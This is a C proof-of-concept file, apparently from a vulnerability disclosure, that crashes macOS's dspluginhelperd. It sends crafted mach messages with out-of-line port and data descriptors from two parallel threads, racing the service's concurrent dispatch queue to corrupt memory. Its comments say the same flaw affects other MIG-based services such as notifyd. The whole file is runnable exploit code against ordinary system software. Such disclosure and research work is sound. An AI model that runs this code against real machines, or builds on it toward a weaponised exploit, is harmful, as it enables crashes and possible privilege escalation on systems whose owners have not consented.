// ianbeer
// build: clang -o dsplug_parallel dsplug_parallel.c -lpthread

/*
crash PoC

dspluginhelperd actually uses a global dispatch queue to receive and process mach messages,
these are by default parallel which makes triggering this bug to demonstrate memory corruption
quite easy, just talk to the service on two threads in parallel.

Note again that this isn't a report about this particular bug in this service but about the
MIG ecosystem - the various hand-written equivilents of mach_msg_server* / dispatch_mig_server
eg in notifyd and lots of other services all have the same issue.
*/


#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>

#include <servers/bootstrap.h>
#include <mach/mach.h>

char* service_name = "com.apple.system.DirectoryService.legacy";

mach_msg_header_t* msg;

struct dsmsg {
  mach_msg_header_t hdr;                // +0 (0x18)
  mach_msg_body_t body;                 // +0x18 (0x4)
  mach_msg_port_descriptor_t ool_port;  // +0x1c (0xc)
  mach_msg_ool_descriptor_t ool_data;   // +0x28 (0x10)
  uint8_t payload[0x8];                 // +0x38 (0x8)
  uint32_t ool_size;                    // +0x40 (0x4)
};                                      // +0x44

mach_port_t service_port = MACH_PORT_NULL;

void* do_thread(void* arg) {
  struct dsmsg* msg = (struct dsmsg*)arg;
  for(;;){
    kern_return_t err;
    err = mach_msg(&msg->hdr,
                   MACH_SEND_MSG|MACH_MSG_OPTION_NONE,
                   (mach_msg_size_t)sizeof(struct dsmsg),
                   0,
                   MACH_PORT_NULL,
                   MACH_MSG_TIMEOUT_NONE,
                   MACH_PORT_NULL); 
    printf("%s\n", mach_error_string(err));
  }
  return NULL;
}

int main() {
  mach_port_t bs;
  task_get_bootstrap_port(mach_task_self(), &bs);

  kern_return_t err = bootstrap_look_up(bs, service_name, &service_port);
  if(err != KERN_SUCCESS){
    printf("unable to look up %s\n", service_name);
    return 1;
  }
  
  if (service_port == MACH_PORT_NULL) {
    printf("bad service port\n");
    return 1;
  }

  printf("got port\n");
  
  void* ool = malloc(0x100000);
  memset(ool, 'A', 0x1000);

  struct dsmsg msg = {0};

  msg.hdr.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
  msg.hdr.msgh_remote_port = service_port;
  msg.hdr.msgh_local_port = MACH_PORT_NULL;
  msg.hdr.msgh_id = 0x2328; // session_create

  msg.body.msgh_descriptor_count = 2;
  
  msg.ool_port.name = MACH_PORT_NULL;
  msg.ool_port.disposition = 20;
  msg.ool_port.type = MACH_MSG_PORT_DESCRIPTOR;

  msg.ool_data.address = ool;
  msg.ool_data.size = 0x1000;
  msg.ool_data.deallocate = 0; //1;
  msg.ool_data.copy = MACH_MSG_VIRTUAL_COPY;//MACH_MSG_PHYSICAL_COPY;
  msg.ool_data.type = MACH_MSG_OOL_DESCRIPTOR;

  msg.ool_size = 0x1000;

  pthread_t threads[2] = {0};
  pthread_create(&threads[0], NULL, do_thread, (void*)&msg);
  pthread_create(&threads[1], NULL, do_thread, (void*)&msg);

  pthread_join(threads[0], NULL);
  pthread_join(threads[1], NULL);


  return 0;
}
